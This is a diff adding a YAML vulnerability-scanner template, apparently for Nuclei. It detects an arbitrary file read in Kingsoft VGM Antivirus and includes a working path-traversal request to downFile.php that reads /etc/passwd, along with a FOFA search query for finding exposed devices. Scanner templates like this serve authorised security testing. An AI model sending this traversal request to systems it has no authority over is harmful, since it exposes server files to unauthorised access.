@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - part: header
+          type: word
+          words:
+            - application/force-download
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/downFile.php?filename=../../../../etc/passwd'
+id: kingsoft-vgm-lfi
+info:
+    author: abbas.heybati
+    description: |
+        There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the server through the vulnerability.
+    metadata:
+        fofa-query: title="金山VGM防毒墙"
+        max-request: 1
+        verified: true
+    name: Kingsoft VGM Antivirus - Arbitrary File Read
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247486073&idx=1&sn=8e61e162262585bb8ce973b61df989b4&chksm=c1f925cbf68eacddfe441b8f1861e88068039712e467fb9bbe91eae31d439286c7147d197b07
+        - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/kongsoft-vgm-antivirus-wall-rce.yaml
+    severity: high
+    tags:
+        - kingsoft
+        - vgm
+        - Kong
+        - 金山VGM防毒墙
